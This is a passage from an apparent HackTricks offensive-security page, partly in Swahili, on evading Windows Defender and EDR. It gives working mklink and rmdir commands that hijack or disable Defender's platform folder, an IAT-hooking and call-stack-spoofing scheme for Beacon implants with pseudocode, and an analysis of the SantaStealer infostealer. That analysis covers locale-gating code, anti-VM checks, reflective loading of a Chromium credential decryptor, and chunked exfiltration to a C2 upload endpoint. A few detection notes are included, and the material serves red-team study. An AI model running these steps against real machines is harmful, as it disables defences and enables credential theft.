mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Uchaguzi wa Trigger (inashauriwa kuanzisha upya):
```cmd
shutdown /r /t 0
```
4) Thibitisha MsMpEng.exe (WinDefend) inaendesha kutoka kwenye njia iliyohamishwa:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Unapaswa kuona njia mpya ya mchakato chini ya `C:\TMP\AV\` na usanidi wa huduma/registry unaonyesha eneo hilo.

Post-exploitation options
- DLL sideloading/code execution: Weka/badilisha DLLs ambazo Defender anazipakia kutoka application directory yake ili execute code ndani ya Defender’s processes. Angalia sehemu hapo juu: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Ondoa version-symlink ili mara itakapoanzishwa tena njia iliyosanidiwa isitatulike na Defender itashindwa kuanza:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Kumbuka kuwa mbinu hii yenyewe haitoi privilege escalation; inahitaji admin rights.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams zinaweza kuhamisha runtime evasion kutoka ndani ya C2 implant na kuiweka ndani ya module lengwa yenyewe kwa ku-hook Import Address Table (IAT) yake na kupitisha APIs zilizochaguliwa kupitia attacker-controlled, position‑independent code (PIC). Hii inapana evasion zaidi ya uso mdogo wa API ambao kits nyingi zinaonyesha (kwa mfano, CreateProcessA), na inapanua kinga zile zile kwa BOFs na post‑exploitation DLLs.

High-level approach
- Stage a PIC blob alongside the target module using a reflective loader (prepended or companion). The PIC must be self‑contained and position‑independent.
- As the host DLL loads, walk its IMAGE_IMPORT_DESCRIPTOR and patch the IAT entries for targeted imports (e.g., CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) to point at thin PIC wrappers.
- Each PIC wrapper executes evasions before tail‑calling the real API address. Typical evasions include:
  - Memory mask/unmask around the call (e.g., encrypt beacon regions, RWX→RX, change page names/permissions) then restore post‑call.
  - Call‑stack spoofing: construct a benign stack and transition into the target API so call‑stack analysis resolves to expected frames.
- For compatibility, export an interface so an Aggressor script (or equivalent) can register which APIs to hook for Beacon, BOFs and post‑ex DLLs.

Why IAT hooking here
- Works for any code that uses the hooked import, without modifying tool code or relying on Beacon to proxy specific APIs.
- Covers post‑ex DLLs: hooking LoadLibrary* lets you intercept module loads (e.g., System.Management.Automation.dll, clr.dll) and apply the same masking/stack evasion to their API calls.
- Restores reliable use of process‑spawning post‑ex commands against call‑stack–based detections by wrapping CreateProcessA/W.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notes
- Apply the patch after relocations/ASLR and before first use of the import. Reflective loaders like TitanLdr/AceLdr demonstrate hooking during DllMain of the loaded module.
- Keep wrappers tiny and PIC-safe; resolve the true API via the original IAT value you captured before patching or via LdrGetProcedureAddress.
- Use RW → RX transitions for PIC and avoid leaving writable+executable pages.

Call‑stack spoofing stub
- Draugr‑style PIC stubs hujenga mnyororo wa simu bandia (return addresses into benign modules) kisha pivot kwenda kwenye API halisi.
- Hii inashinda detections zinazotarajia canonical stacks kutoka Beacon/BOFs hadi sensitive APIs.
- Pair na stack cutting/stack stitching techniques ili kuingia ndani ya frames zinazotarajiwa kabla ya prologue ya API.

Operational integration
- Prepend the reflective loader kwa post‑ex DLLs ili PIC na hooks wianzishwe moja kwa moja wakati DLL inapopakiwa.
- Tumia Aggressor script kusajili target APIs ili Beacon na BOFs zifaidike kwa njia ileile ya evasion bila mabadiliko ya code.

Detection/DFIR considerations
- IAT integrity: entries that resolve to non‑image (heap/anon) addresses; periodic verification of import pointers.
- Stack anomalies: return addresses not belonging to loaded images; abrupt transitions to non‑image PIC; inconsistent RtlUserThreadStart ancestry.
- Loader telemetry: in‑process writes to IAT, early DllMain activity that modifies import thunks, unexpected RX regions created at load.
- Image‑load evasion: if hooking LoadLibrary*, monitor suspicious loads of automation/clr assemblies correlated with memory masking events.

Related building blocks and examples
- Reflective loaders that perform IAT patching during load (e.g., TitanLdr, AceLdr)
- Memory masking hooks (e.g., simplehook) and stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (e.g., Draugr)

## SantaStealer Tradecraft for Fileless Evasion and Credential Theft

SantaStealer (aka BluelineStealer) inaonyesha jinsi info-stealers wa kisasa wanavyounganisha AV bypass, anti-analysis na credential access katika mtiririko mmoja wa kazi.

### Keyboard layout gating & sandbox delay

- A config flag (`anti_cis`) huorodhesha installed keyboard layouts kupitia `GetKeyboardLayoutList`. Ikiwa mpangilio wa Cyrillic utapatikana, sample inaacha alama tupu `CIS` na inamaliza utekelezaji kabla ya kuendesha stealers, kuhakikisha haitafyatuka kwenye locales zilizokataliwa huku ikiacha artifact ya kuwinda.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Mantiki ya tabaka ya `check_antivm`

- Variant A hupitia orodha ya michakato, inahash kila jina kwa custom rolling checksum, na ikalinganisha dhidi ya embedded blocklists kwa ajili ya debuggers/sandboxes; inarudia checksum juu ya jina la kompyuta na hukagua working directories kama `C:\analysis`.
- Variant B inachunguza system properties (process-count floor, recent uptime), inaita `OpenServiceA("VBoxGuest")` kugundua VirtualBox additions, na inafanya timing checks karibu na sleeps ili kubaini single-stepping. Hit yoyote hupelekea abort kabla modules kuanzishwa.

### Fileless helper + double ChaCha20 reflective loading

- DLL/EXE kuu ina-embed Chromium credential helper ambayo inaweza kutolewa kwenye disk au ku-mapped kwa mkono katika-memory; fileless mode hutatua imports/relocations yenyewe hivyo hakuna helper artifacts yanaandikwa.
- Msaidizi huyo huhifadhi DLL ya hatua ya pili iliyosimbwa mara mbili kwa ChaCha20 (vifunguo viwili vya 32-byte + nonces za 12-byte). Baada ya kupitishwa mara mbili, inaload reflectively blob (hakuna `LoadLibrary`) na inaita exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` zinazotokana na [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).
- Routines za ChromElevator zinatumia direct-syscall reflective process hollowing ku-inject ndani ya browser ya Chromium iliyo hai, kurithisha AppBound Encryption keys, na ku-decrypt passwords/cookies/credit cards moja kwa moja kutoka kwa SQLite databases licha ya ABE hardening.

### Modular in-memory collection & chunked HTTP exfil

- `create_memory_based_log` hupitia global `memory_generators` function-pointer table na huanzisha thread moja kwa kila module iliyowezeshwa (Telegram, Discord, Steam, screenshots, documents, browser extensions, n.k.). Kila thread inaandika matokeo ndani ya shared buffers na kuripoti idadi ya faili baada ya dirisha la ~45s la join.
- Baada ya kumaliza, kila kitu kinazipwa kwa kutumia statically linked `miniz` library kama `%TEMP%\\Log.zip`. `ThreadPayload1` kisha inalala 15s na ku-stream archive katika chunks za 10 MB kupitia HTTP POST kwenda `http://<C2>:6767/upload`, ikidanganya browser `multipart/form-data` boundary (`----WebKitFormBoundary***`). Kila chunk inaongeza `User-Agent: upload`, `auth: <build_id>`, hiari `w: <campaign_tag>`, na chunk ya mwisho inaambatisha `complete: true` ili C2 ijue reassembly imekamilika.

## References

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)

{{#include ../banners/hacktricks-training.md}}
